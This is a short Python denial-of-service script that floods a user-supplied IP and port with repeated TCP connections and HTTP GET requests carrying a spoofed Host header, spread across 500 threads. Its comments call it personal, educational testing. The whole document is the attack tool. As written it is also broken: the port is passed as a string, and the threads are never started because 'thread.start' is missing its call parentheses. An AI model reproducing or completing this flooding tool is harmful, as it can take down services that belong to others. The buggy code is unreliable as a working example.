#DOS script for my own personal testing purposes within my personal network.
#For educational purposes only!

import threading
import socket
import argparse

#Parses the arguments
parser = argparse.ArgumentParser(description="Target IP")
parser.add_argument("target", metavar='target', type=str, help='Target IP:')
parser.add_argument("port", metavar='port', type=str, help='Taget Port')
args = parser.parse_args()

#definition of variables using args
ip = args.target
portNum = args.port
fakeIP = "0.1.1.0"

#Connects to target ip
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, portNum))
        s.sendto(("GET /" + ip + " HTTP/1.1\r\n").encode('ascii'), (ip, portNum))
        s.sendto(("Host: " + fakeIP + "\r\n\r\n").encode("ascii"), (ip, portNum))
        s.close()

#loops the attack function 500 times
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start
print("Finished")



